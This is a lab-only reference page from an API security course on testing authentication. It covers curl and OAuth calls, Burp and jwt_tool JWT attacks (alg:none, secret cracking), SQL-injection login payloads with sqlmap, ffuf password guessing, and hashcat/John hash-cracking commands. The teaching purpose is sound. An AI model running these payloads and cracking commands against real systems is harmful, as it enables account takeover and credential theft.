# Real tools: testing API authentication (hedged)

**Course items:** "Talking To An API Using OAuth and JWT", "Talking To An API Using HTTP Basic and API Keys", "Exploiting Broken Authentication With SQL Injection", "Exploiting Broken Authentication With Weak Passwords", "Cracking Weak Password Hashes With Dictionaries", "Cracking Weak Password Hashes With Bruteforce And Combinations", "Abusing JWT Tokens" ([CASP 3]). Each item also has an offline lab in this chapter; this page is for your **course lab environment** only.

> Only test systems you own or have written permission to test. Crack only hashes you generated or that your course lab gives you. Tool flags change: **check `--help` and the project docs for your version.**

## HTTP Basic, API keys, OAuth and JWT from the command line

```bash
curl -s -u "user:$PW" https://api.lab/basic                          # Basic
curl -s -H "X-API-Key: $API_KEY" https://api.lab/apikey               # API key in a header
TOKEN=$(curl -s https://login.lab/oauth/token -d grant_type=client_credentials \
        -d client_id=$CID -d client_secret=$CSECRET | jq -r .access_token)  # OAuth client credentials
curl -s -H "Authorization: Bearer $TOKEN" https://api.lab/orders     # bearer call
```

Postman's OAuth 2.0 helper (Authorization tab → OAuth 2.0 → Get New Access Token) supports authorization code with PKCE and client credentials ([Postman guide](../../09-api-tooling-and-reconnaissance/real-tools/postman-and-alternatives.md)).

## Burp Suite for authentication testing

- **Repeater:** remove or alter `Authorization`, swap tokens between users, change `alg`, edit claims.
- **JWT extensions** from the BApp Store (for example "JWT Editor"; verify the current name and maintenance): decode, re-sign, test `alg:none`, embedded JWK and key-confusion attacks.
- **Intruder** (Community is throttled) for small, agreed lists against login or OTP endpoints in your lab.
- Setup: [Burp Suite for APIs](../../09-api-tooling-and-reconnaissance/real-tools/burp-suite-for-apis.md).

## jwt_tool (Python, open source; verify maintenance)

```bash
python3 jwt_tool.py "$TOKEN"                         # decode and show claims
python3 jwt_tool.py "$TOKEN" -X a                    # try alg:none variants
python3 jwt_tool.py "$TOKEN" -C -d small-list.txt    # crack an HS256 secret with a word list
python3 jwt_tool.py "$TOKEN" -T                      # tamper claims interactively, then re-sign
```

## SQL injection in the login (course lab)

Manual payloads in the username field through Burp Repeater (`admin' -- `, `' OR '1'='1' -- `), then confirm with **sqlmap** on the lab target only:

```bash
sqlmap -u "https://api.lab/api/login" --data '{"username":"*","password":"x"}' \
       -H "Content-Type: application/json" --batch --level 2 --risk 1
```

sqlmap is covered fully in [chapter 12](../../12-input-validation-and-injection/README.md).

## Online guessing against a lab login

Use the course's wordlist and an agreed rate. ffuf example:

```bash
ffuf -u https://api.lab/api/login -X POST -H 'Content-Type: application/json' \
     -d '{"username":"carol","password":"FUZZ"}' -w lab-passwords.txt -mc 200 -rate 5
```

Hydra also supports HTTP forms (`http-post-form`); its syntax for JSON APIs is awkward, so ffuf or Burp is usually easier.

## Offline hash cracking (hashcat / John the Ripper)

Typical hash modes (hashcat `-m`; verify with `hashcat --help`): 0 = MD5, 100 = SHA-1, 1400 = SHA-256, 3200 = bcrypt, 10900 = PBKDF2-HMAC-SHA256, 8900 = scrypt.

```bash
# dictionary attack
hashcat -m 0 -a 0 lab_md5.txt small-list.txt
# dictionary + rules (variants of each word)
hashcat -m 0 -a 0 lab_md5.txt small-list.txt -r rules/best64.rule
# brute force / mask: up to 4 lowercase letters
hashcat -m 0 -a 3 lab_md5.txt '?l?l?l?l' --increment
# combinator: word + word
hashcat -m 0 -a 1 lab_md5.txt words1.txt words2.txt
# hybrid: word + 4 digits
hashcat -m 0 -a 6 lab_md5.txt small-list.txt '?d?d?d?d'

# John the Ripper equivalents
john --format=raw-md5 --wordlist=small-list.txt lab_md5.txt
john --format=raw-md5 --incremental=Lower --max-length=4 lab_md5.txt
john --show --format=raw-md5 lab_md5.txt
```

Compare the reported speed for `-m 0` (MD5) with `-m 10900` (PBKDF2) or `-m 3200` (bcrypt) on the same machine: that ratio is the whole argument for slow, salted hashing (the [offline lab](../labs/password-hash-cracking/README.md) measures it in Python).

## OIDC configuration

```bash
curl -s https://login.lab/.well-known/openid-configuration | jq \
  '{issuer, response_types_supported, grant_types_supported,
    id_token_signing_alg_values_supported, code_challenge_methods_supported}'
```

Then feed the JSON into the [oidc-config-check lab](../labs/oidc-config-check/README.md)'s `check_discovery`.
